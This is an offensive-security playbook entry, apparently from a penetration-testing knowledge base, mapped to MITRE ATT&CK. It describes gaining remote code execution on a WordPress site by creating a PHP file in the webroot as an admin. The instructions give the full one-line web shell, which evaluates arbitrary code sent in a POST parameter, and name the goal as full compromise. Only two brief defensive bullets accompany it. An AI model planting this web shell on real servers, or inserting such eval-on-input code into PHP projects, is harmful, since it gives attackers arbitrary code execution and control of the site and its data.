---
tags:
  - rce
  - php
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Command-Line Interface]]'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
id: 12da4357-d231-4247-9012-05f3a73ef9f6
created_at: '2025-12-11T03:47:39.220Z'
updated_at: '2025-12-11T03:47:39.220Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059]]'
---
# Demonstrate RCE via PHP Script Creation

## Summary

This procedure demonstrates remote code execution by creating a malicious PHP script as an admin, chained with other vulnerabilities like those in WPEngine.

## Description

With admin access, upload or create a PHP file that evaluates POST data, proving RCE in the WordPress environment.

## Requirements

1. Admin privileges from previous steps
2. Access to file creation in webroot
3. Chained vulnerabilities present

## Defense

Defensive measures and detection strategies:

- Restrict file creation in admin panels
- Monitor for suspicious file uploads

## Objectives

1. Create executable PHP script
2. Prove code execution
3. Achieve full compromise

## Instructions

### Step 1: Create PHP File

**Context**: As admin, create bugb.php with eval code.

Content: <?php eval($_POST["php"]); ?>

> Place under webroot to test execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques

## Commands Used

## Tools Used

## Tags

- #rce
- [[PHP]]
